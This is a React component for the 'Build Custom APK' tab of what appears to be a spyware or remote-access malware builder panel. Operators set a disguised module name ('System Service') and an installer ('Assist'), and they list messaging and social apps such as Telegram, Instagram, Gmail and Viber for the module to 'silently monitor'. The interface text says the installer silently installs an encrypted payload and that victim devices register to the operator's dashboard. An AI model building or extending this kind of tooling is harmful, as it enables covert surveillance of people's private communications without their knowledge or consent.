import React, { useState, useEffect, useRef, useCallback } from 'react';

// Build APK tab — lets a logged-in user customise the installer + module
// app names, package names, and the list of monitored packages, then kicks
// off a build job on the dashboard. The job is picked up by a remote
// build.sh worker (see /api/build/worker/*). The resulting APKs are scoped
// to the user's Access ID so multiple users can build in parallel without
// overwriting each other's outputs.

const styles = {
  page: {
    height: '100%',
    overflow: 'auto',
    padding: '4px 4px 24px 4px',
    color: '#e2e8f0',
    fontFamily: '"Inter","Segoe UI",sans-serif',
  },
  card: {
    background: 'rgba(15,23,42,0.6)',
    border: '1px solid #1e293b',
    borderRadius: 12,
    padding: 20,
    marginBottom: 16,
  },
  title: { fontSize: 16, fontWeight: 600, color: '#a5b4fc', marginBottom: 4 },
  subtitle: { fontSize: 12, color: '#64748b', marginBottom: 14 },
  // Two-column layout for installer + module side-by-side. Collapses to one
  // column on narrow screens.
  twoCol: {
    display: 'grid',
    gridTemplateColumns: 'repeat(auto-fit, minmax(320px, 1fr))',
    gap: 16,
  },
  column: {
    background: 'rgba(2,6,23,0.45)',
    border: '1px solid #1e293b',
    borderRadius: 10,
    padding: 16,
    display: 'flex',
    flexDirection: 'column',
    gap: 14,
  },
  colHeader: {
    display: 'flex',
    alignItems: 'center',
    gap: 8,
    paddingBottom: 8,
    borderBottom: '1px solid #1e293b',
    fontSize: 13,
    fontWeight: 700,
    color: '#c4b5fd',
    letterSpacing: 0.4,
    textTransform: 'uppercase',
  },
  field: { display: 'flex', flexDirection: 'column', gap: 4 },
  label: { fontSize: 11, color: '#94a3b8', textTransform: 'uppercase', letterSpacing: 0.5, fontWeight: 600 },
  hint: { fontSize: 11, color: '#475569' },
  input: {
    background: 'rgba(2,6,23,0.6)',
    border: '1px solid #334155',
    borderRadius: 6,
    padding: '8px 10px',
    color: '#e2e8f0',
    fontSize: 13,
    outline: 'none',
    fontFamily: 'inherit',
  },
  textarea: {
    background: 'rgba(2,6,23,0.6)',
    border: '1px solid #334155',
    borderRadius: 6,
    padding: '8px 10px',
    color: '#e2e8f0',
    fontSize: 12.5,
    fontFamily: '"JetBrains Mono","Fira Code",monospace',
    outline: 'none',
    minHeight: 130,
    resize: 'vertical',
    lineHeight: 1.4,
  },
  inputErr: { borderColor: '#ef4444' },
  errMsg: { color: '#f87171', fontSize: 11 },
  btnRow: { display: 'flex', gap: 10, marginTop: 18, alignItems: 'center', flexWrap: 'wrap' },
  buildBtn: {
    background: 'linear-gradient(135deg,#6366f1 0%,#8b5cf6 100%)',
    color: '#fff', border: 'none', borderRadius: 8,
    padding: '10px 22px', fontSize: 13, fontWeight: 600,
    cursor: 'pointer',
  },
  buildBtnDisabled: { opacity: 0.5, cursor: 'not-allowed' },
  dlBtn: {
    background: 'rgba(34,197,94,0.15)',
    border: '1px solid rgba(34,197,94,0.4)',
    color: '#86efac',
    borderRadius: 8,
    padding: '8px 16px',
    fontSize: 12,
    fontWeight: 600,
    cursor: 'pointer',
    textDecoration: 'none',
    display: 'inline-flex',
    alignItems: 'center',
    gap: 6,
  },
  status: { fontSize: 12, color: '#94a3b8' },
  badge: (color) => ({
    display: 'inline-block', padding: '2px 8px', borderRadius: 10,
    fontSize: 11, fontWeight: 600, color, background: `${color}22`, border: `1px solid ${color}55`,
  }),
  logPane: {
    background: '#020617',
    border: '1px solid #1e293b',
    borderRadius: 8,
    padding: 12,
    fontFamily: '"JetBrains Mono","Fira Code",monospace',
    fontSize: 11.5,
    color: '#cbd5e1',
    height: 360,
    overflow: 'auto',
    whiteSpace: 'pre-wrap',
    lineHeight: 1.45,
  },
  accessIdBox: {
    background: 'rgba(99,102,241,0.1)',
    border: '1px dashed rgba(99,102,241,0.4)',
    borderRadius: 8,
    padding: '10px 14px',
    marginBottom: 16,
    fontSize: 12,
    color: '#a5b4fc',
  },
  workerPill: (online) => ({
    display: 'inline-flex', alignItems: 'center', gap: 6,
    padding: '3px 10px', borderRadius: 12, fontSize: 11, fontWeight: 600,
    color: online ? '#86efac' : '#fca5a5',
    background: online ? 'rgba(34,197,94,0.12)' : 'rgba(239,68,68,0.12)',
    border: `1px solid ${online ? 'rgba(34,197,94,0.4)' : 'rgba(239,68,68,0.4)'}`,
  }),
};

const PKG_REGEX  = /^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/;
const NAME_REGEX = /^[\w .&'-]{1,40}$/;

// Default monitored packages — mirrors the in-tree
// app/src/main/java/com/task/tusker/utils/Constants.java MONITORED_PACKAGES
// list. Users can add or remove freely.
const DEFAULT_MONITORED_PACKAGES = [
  'com.android.stk',
  'com.instagram.android',
  'com.facebook.katana',
  'org.telegram.messenger',
  'com.snapchat.android',
  'com.zhiliaoapp.musically',
  'com.twitter.android',
  'com.facebook.orca',
  'com.google.android.gm',
  'com.viber.voip',
  'com.skype.raider',
];

function getToken() {
  return localStorage.getItem('user_token') || localStorage.getItem('admin_token') || '';
}
function authHeaders() {
  const t = getToken();
  return t ? { Authorization: `Bearer ${t}` } : {};
}

export default function BuildApkTab({ user }) {
  // ── Module column state ─────────────────────────────────────────────────
  const [moduleName,        setModuleName]        = useState('System Service');
  const [modulePackage,     setModulePackage]     = useState('com.task.tusker');
  const [monitoredText,     setMonitoredText]     = useState(DEFAULT_MONITORED_PACKAGES.join('\n'));

  // ── Installer column state ──────────────────────────────────────────────
  const [installerName,     setInstallerName]     = useState('Assist');
  const [installerPackage,  setInstallerPackage]  = useState('com.onerule.task');

  const [errors, setErrors]       = useState({});
  const [running, setRunning]     = useState(false);
  const [logs, setLogs]           = useState([]);
  const [lastResult, setLastResult] = useState(null);
  const [accessId, setAccessId]   = useState(user?.accessId || '');
  const [downloads, setDownloads] = useState({ module: false, installer: false });
  const [workerOnline, setWorkerOnline] = useState(false);
  const logEndRef = useRef(null);
  const pollIdRef = useRef(null);

  useEffect(() => {
    if (logEndRef.current) logEndRef.current.scrollTop = logEndRef.current.scrollHeight;
  }, [logs]);

  const fetchStatus = useCallback(async () => {
    try {
      const r = await fetch('/api/build/status', { headers: authHeaders() });
      if (!r.ok) return null;
      const d = await r.json();
      if (d.success) {
        setRunning(!!d.running);
        setWorkerOnline(!!d.workerOnline);
        if (d.isMyBuild && Array.isArray(d.lines) && d.lines.length > 0) {
          setLogs(d.lines);
        }
        if (!d.running && d.isMyBuild && d.success_ != null) {
          setLastResult({ success: !!d.success_, error: d.error || null });
        }
        return d;
      }
    } catch (_) { /* network blip */ }
    return null;
  }, []);

  useEffect(() => { fetchStatus(); }, [fetchStatus]);

  useEffect(() => {
    if (!running) {
      if (pollIdRef.current) { clearInterval(pollIdRef.current); pollIdRef.current = null; }
      if (accessId) checkDownloadAvailability();
      return;
    }
    pollIdRef.current = setInterval(fetchStatus, 1500);
    return () => {
      if (pollIdRef.current) { clearInterval(pollIdRef.current); pollIdRef.current = null; }
    };
  }, [running, fetchStatus, accessId]);

  const checkDownloadAvailability = useCallback(async () => {
    const probe = async (type) => {
      try {
        const r = await fetch(`/api/build/download/${type}`, { method: 'HEAD', headers: authHeaders() });
        return r.ok;
      } catch (_) { return false; }
    };
    const [m, i] = await Promise.all([probe('module'), probe('installer')]);
    setDownloads({ module: m, installer: i });
  }, []);

  useEffect(() => { checkDownloadAvailability(); }, [checkDownloadAvailability]);

  const parseMonitored = () => {
    return monitoredText
      .split(/[\s,]+/)
      .map((s) => s.trim())
      .filter(Boolean);
  };

  const validate = () => {
    const e = {};
    if (!NAME_REGEX.test(moduleName.trim()))      e.moduleName       = '1-40 chars: letters, digits, space, . & \' -';
    if (!PKG_REGEX.test(modulePackage.trim()))    e.modulePackage    = 'e.g. com.example.app (lowercase, dot-separated)';
    if (!NAME_REGEX.test(installerName.trim()))   e.installerName    = '1-40 chars: letters, digits, space, . & \' -';
    if (!PKG_REGEX.test(installerPackage.trim())) e.installerPackage = 'e.g. com.example.installer';
    if (modulePackage.trim() === installerPackage.trim() && !e.modulePackage && !e.installerPackage) {
      e.installerPackage = 'Must differ from module package';
    }
    const monList = parseMonitored();
    const bad = monList.filter((p) => !PKG_REGEX.test(p));
    if (bad.length > 0) {
      e.monitored = `Invalid package(s): ${bad.slice(0, 3).join(', ')}${bad.length > 3 ? '…' : ''}`;
    }
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const startBuild = async () => {
    if (!validate() || running) return;
    setLogs([]);
    setLastResult(null);
    setDownloads({ module: false, installer: false });

    try {
      const r = await fetch('/api/build/apk', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', ...authHeaders() },
        body: JSON.stringify({
          moduleName:        moduleName.trim(),
          modulePackage:     modulePackage.trim(),
          installerName:     installerName.trim(),
          installerPackage:  installerPackage.trim(),
          monitoredPackages: parseMonitored(),
        }),
      });
      const d = await r.json();
      if (!r.ok || !d.success) {
        setLastResult({ success: false, error: d.error || 'Build request failed' });
        return;
      }
      if (d.accessId) setAccessId(d.accessId);
      setWorkerOnline(!!d.workerOnline);
      setRunning(true);
      setLogs([
        d.workerOnline
          ? '▶ Build queued — waiting for worker to pick it up…'
          : '⚠ Build queued, but no build worker is currently online. It will start as soon as one connects.',
      ]);
    } catch (err) {
      setLastResult({ success: false, error: err.message });
    }
  };

  const downloadApk = async (type) => {
    // Request a short-lived one-time ticket, then let the browser stream
    // the APK straight to disk via a normal navigation. This starts the
    // download instantly and shows native progress, instead of buffering
    // the whole file into memory as a Blob first.
    try {
      const r = await fetch(`/api/build/download/${type}/ticket`, {
        method: 'POST',
        headers: authHeaders(),
      });
      const d = await r.json().catch(() => ({}));
      if (!r.ok || !d.success || !d.url) {
        throw new Error(d.error || `HTTP ${r.status}`);
      }
      const a = document.createElement('a');
      a.href = d.url;
      a.download = type === 'module' ? 'Module.apk' : 'Installer.apk';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    } catch (err) {
      alert(`Download failed: ${err.message}`);
    }
  };

  const fmtField = (key, value, setter, placeholder, hint) => (
    <div style={styles.field}>
      <label style={styles.label}>{placeholder}</label>
      <input
        type="text"
        style={{ ...styles.input, ...(errors[key] ? styles.inputErr : {}) }}
        value={value}
        onChange={(e) => setter(e.target.value)}
        disabled={running}
        spellCheck={false}
        autoComplete="off"
      />
      {errors[key]
        ? <span style={styles.errMsg}>{errors[key]}</span>
        : <span style={styles.hint}>{hint}</span>}
    </div>
  );

  return (
    <div style={styles.page}>
      <div style={styles.card}>
        <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', gap: 12 }}>
          <div>
            <div style={styles.title}>📦 Build Custom APK</div>
            <div style={styles.subtitle}>
              Configure the installer and module independently, then build.
              Your Access ID is baked into every device that registers with these APKs.
            </div>
          </div>
          <span style={styles.workerPill(workerOnline)}>
            <span style={{
              width: 7, height: 7, borderRadius: '50%',
              background: workerOnline ? '#22c55e' : '#ef4444',
            }} />
            {workerOnline ? 'Build worker online' : 'Build worker offline'}
          </span>
        </div>

        {accessId ? (
          <div style={styles.accessIdBox}>
            🔑 <strong>Your Access ID:</strong> <code style={{ color: '#c4b5fd' }}>{accessId}</code>
            <div style={{ fontSize: 11, color: '#64748b', marginTop: 4 }}>
              All devices installed from APKs you build here will appear only in your dashboard.
            </div>
          </div>
        ) : (
          <div style={{ ...styles.accessIdBox, color: '#fca5a5', borderColor: 'rgba(239,68,68,0.4)', background: 'rgba(239,68,68,0.08)' }}>
            ⚠️ No Access ID found on your account. Contact support to have one assigned.
          </div>
        )}

        {/* ── Two columns: Installer | Module ──────────────────────────── */}
        <div style={styles.twoCol}>
          {/* Installer column */}
          <div style={styles.column}>
            <div style={styles.colHeader}>
              <span style={{ fontSize: 16 }}>📥</span>
              Installer
            </div>
            {fmtField('installerName',    installerName,    setInstallerName,    'Installer App Name',  'e.g. "Assist"')}
            {fmtField('installerPackage', installerPackage, setInstallerPackage, 'Installer Package',   'e.g. com.onerule.task')}
            <div style={{ ...styles.hint, marginTop: 'auto', paddingTop: 8 }}>
              The installer is the small app users actually download and tap to install. It contains the
              encrypted module and silently installs it on launch.
            </div>
          </div>

          {/* Module column */}
          <div style={styles.column}>
            <div style={styles.colHeader}>
              <span style={{ fontSize: 16 }}>🧩</span>
              Module
            </div>
            {fmtField('moduleName',    moduleName,    setModuleName,    'Module App Name', 'e.g. "System Service"')}
            {fmtField('modulePackage', modulePackage, setModulePackage, 'Module Package',  'e.g. com.task.tusker')}

            <div style={styles.field}>
              <label style={styles.label}>
                Monitored Packages
                <span style={{ marginLeft: 8, color: '#64748b', fontWeight: 400, textTransform: 'none', letterSpacing: 0 }}>
                  ({parseMonitored().length} apps)
                </span>
              </label>
              <textarea
                style={{ ...styles.textarea, ...(errors.monitored ? styles.inputErr : {}) }}
                value={monitoredText}
                onChange={(e) => setMonitoredText(e.target.value)}
                disabled={running}
                spellCheck={false}
                placeholder={'com.whatsapp\ncom.instagram.android\ncom.facebook.katana'}
              />
              {errors.monitored
                ? <span style={styles.errMsg}>{errors.monitored}</span>
                : <span style={styles.hint}>
                    One Android package name per line (or comma-separated). These are the apps the
                    module silently monitors. Defaults shown — edit freely.
                  </span>}
            </div>
          </div>
        </div>

        <div style={styles.btnRow}>
          <button
            style={{ ...styles.buildBtn, ...(running || !accessId ? styles.buildBtnDisabled : {}) }}
            onClick={startBuild}
            disabled={running || !accessId}
          >
            {running ? '⏳ Building…' : '🔨 Start Build'}
          </button>

          {running   && <span style={styles.badge('#fbbf24')}>BUILDING</span>}
          {!running && lastResult?.success === true  && <span style={styles.badge('#22c55e')}>SUCCESS</span>}
          {!running && lastResult?.success === false && <span style={styles.badge('#ef4444')}>FAILED</span>}

          <span style={{ flex: 1 }} />

          {downloads.module && (
            <button style={styles.dlBtn} onClick={() => downloadApk('module')}>⬇ Module.apk</button>
          )}
          {downloads.installer && (
            <button style={styles.dlBtn} onClick={() => downloadApk('installer')}>⬇ Installer.apk</button>
          )}
        </div>

        {lastResult?.error && !running && (
          <div style={{ marginTop: 10, color: '#f87171', fontSize: 12 }}>
            Error: {lastResult.error}
          </div>
        )}
      </div>

      <div style={styles.card}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
          <div style={styles.title}>📜 Build Log</div>
          <span style={styles.status}>
            {running ? 'Streaming live…' : (logs.length > 0 ? `${logs.length} lines` : 'No active build')}
          </span>
        </div>
        <div ref={logEndRef} style={styles.logPane}>
          {logs.length === 0
            ? <div style={{ color: '#475569' }}>Logs will appear here once you start a build. Builds take ~2 minutes.</div>
            : logs.map((ln, i) => <div key={i}>{ln}</div>)}
        </div>
      </div>
    </div>
  );
}
